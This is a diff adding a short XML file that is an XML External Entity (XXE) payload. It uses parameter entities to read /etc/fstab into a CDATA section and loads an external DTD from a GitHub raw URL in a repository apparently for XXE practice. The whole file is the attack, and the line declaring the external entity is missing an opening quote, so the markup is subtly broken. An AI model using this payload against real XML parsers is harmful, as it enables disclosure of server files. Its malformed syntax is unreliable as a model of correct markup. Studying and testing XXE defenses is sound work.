@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE message [
+<!ELEMENT message (text)>
+<!ELEMENT text (#PCDATA)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % middle SYSTEM "file:///etc/fstab">
+<!ENTITY % end "]]>">
+<!ENTITY % exe SYSTEM https://raw.githubusercontent.com/hoguer/xxe_play/master/combo.txt">
+%exe;
+]>
+<message>
+<text>&xxe;</text>
+</message>
